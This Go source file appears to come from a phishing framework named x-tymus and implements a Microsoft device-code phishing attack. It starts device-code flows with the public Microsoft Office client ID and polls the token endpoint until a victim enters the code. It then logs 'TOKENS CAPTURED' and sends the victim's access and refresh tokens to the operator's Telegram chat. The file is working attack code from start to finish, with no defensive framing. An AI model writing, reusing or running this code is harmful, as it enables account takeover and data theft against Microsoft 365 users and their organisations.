package core

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/x-tymus/x-tymus/log"
)

// Microsoft Office public client — no app registration needed.
const (
	dcClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	dcScope    = "https://graph.microsoft.com/.default offline_access openid profile email"
)

// DeviceCodeSession tracks a single in-flight device code flow.
type DeviceCodeSession struct {
	ID              int
	Tenant          string
	UserCode        string
	VerificationURI string
	ExpiresIn       int
	StartedAt       time.Time
	Status          string // pending | completed | declined | expired | error
	AccessToken     string
	RefreshToken    string
	IDToken         string
	mu              sync.Mutex
	deviceCode      string
	interval        int
}

var (
	dcMu      sync.Mutex
	dcList    []*DeviceCodeSession
	dcNextID  = 1
)

// StartDeviceCode initiates a new device code flow for the given tenant or email.
// The session starts background polling immediately; tokens arrive via Telegram
// notification and are stored on the session struct.
func StartDeviceCode(tenantOrEmail string) (*DeviceCodeSession, error) {
	tenant := "common"
	if tenantOrEmail != "" {
		if strings.Contains(tenantOrEmail, "@") {
			parts := strings.SplitN(tenantOrEmail, "@", 2)
			tenant = parts[1]
		} else {
			tenant = tenantOrEmail
		}
	}

	apiURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", tenant)

	form := url.Values{}
	form.Set("client_id", dcClientID)
	form.Set("scope", dcScope)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var dc struct {
		DeviceCode      string `json:"device_code"`
		UserCode        string `json:"user_code"`
		VerificationURI string `json:"verification_uri"`
		ExpiresIn       int    `json:"expires_in"`
		Interval        int    `json:"interval"`
		Error           string `json:"error"`
		ErrorDesc       string `json:"error_description"`
	}
	if err := json.Unmarshal(body, &dc); err != nil {
		return nil, fmt.Errorf("bad response: %v", err)
	}
	if dc.Error != "" {
		return nil, fmt.Errorf("%s — %s", dc.Error, dc.ErrorDesc)
	}

	interval := dc.Interval
	if interval < 5 {
		interval = 5
	}

	dcMu.Lock()
	sess := &DeviceCodeSession{
		ID:              dcNextID,
		Tenant:          tenant,
		deviceCode:      dc.DeviceCode,
		UserCode:        dc.UserCode,
		VerificationURI: dc.VerificationURI,
		ExpiresIn:       dc.ExpiresIn,
		StartedAt:       time.Now(),
		Status:          "pending",
		interval:        interval,
	}
	dcNextID++
	dcList = append(dcList, sess)
	dcMu.Unlock()

	go sess.poll(tenant)
	return sess, nil
}

// GetDeviceCodeSessions returns a snapshot of all sessions.
func GetDeviceCodeSessions() []*DeviceCodeSession {
	dcMu.Lock()
	defer dcMu.Unlock()
	out := make([]*DeviceCodeSession, len(dcList))
	copy(out, dcList)
	return out
}

// poll loops until the user authenticates, the code expires, or an error occurs.
func (s *DeviceCodeSession) poll(tenant string) {
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenant)
	deadline := s.StartedAt.Add(time.Duration(s.ExpiresIn) * time.Second)
	interval := s.interval

	for time.Now().Before(deadline) {
		time.Sleep(time.Duration(interval) * time.Second)

		form := url.Values{}
		form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
		form.Set("device_code", s.deviceCode)
		form.Set("client_id", dcClientID)

		resp, err := http.PostForm(tokenURL, form)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var tok struct {
			TokenType    string `json:"token_type"`
			AccessToken  string `json:"access_token"`
			RefreshToken string `json:"refresh_token"`
			IDToken      string `json:"id_token"`
			Error        string `json:"error"`
		}
		if err := json.Unmarshal(body, &tok); err != nil {
			continue
		}

		switch tok.Error {
		case "authorization_pending":
			// normal — keep waiting
		case "slow_down":
			interval += 5
		case "authorization_declined":
			s.mu.Lock()
			s.Status = "declined"
			s.mu.Unlock()
			log.Warning("devicecode [#%d]: user declined", s.ID)
			return
		case "expired_token":
			s.mu.Lock()
			s.Status = "expired"
			s.mu.Unlock()
			log.Warning("devicecode [#%d]: code expired", s.ID)
			return
		case "":
			s.mu.Lock()
			s.Status = "completed"
			s.AccessToken = tok.AccessToken
			s.RefreshToken = tok.RefreshToken
			s.IDToken = tok.IDToken
			s.mu.Unlock()
			log.Success("devicecode [#%d] (%s): TOKENS CAPTURED", s.ID, s.Tenant)
			log.Info("  access_token : %s...", trunc(tok.AccessToken, 60))
			log.Info("  refresh_token: %s...", trunc(tok.RefreshToken, 60))
			dcNotify(s)
			return
		default:
			s.mu.Lock()
			s.Status = "error"
			s.mu.Unlock()
			log.Error("devicecode [#%d]: %s", s.ID, tok.Error)
			return
		}
	}

	s.mu.Lock()
	if s.Status == "pending" {
		s.Status = "expired"
	}
	s.mu.Unlock()
	log.Warning("devicecode [#%d]: expired (no auth)", s.ID)
}

// dcNotify sends tokens to the admin Telegram chat.
func dcNotify(s *DeviceCodeSession) {
	if GlobalBot == nil {
		return
	}
	adminID := GlobalBot.cfg.GetBotAdminChatId()
	if adminID == 0 {
		return
	}
	msg := fmt.Sprintf(
		"🎯 *Device Code — Tokens Captured\\! \\[\\#%d\\]*\n\n"+
			"🏢 Tenant: `%s`\n"+
			"👤 Code entered: `%s`\n\n"+
			"🔑 *Access Token:*\n`%s`\n\n"+
			"♻️ *Refresh Token:*\n`%s`",
		s.ID,
		tgEscape(s.Tenant),
		tgEscape(s.UserCode),
		trunc(s.AccessToken, 200),
		trunc(s.RefreshToken, 200),
	)
	GlobalBot.send(adminID, msg)
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
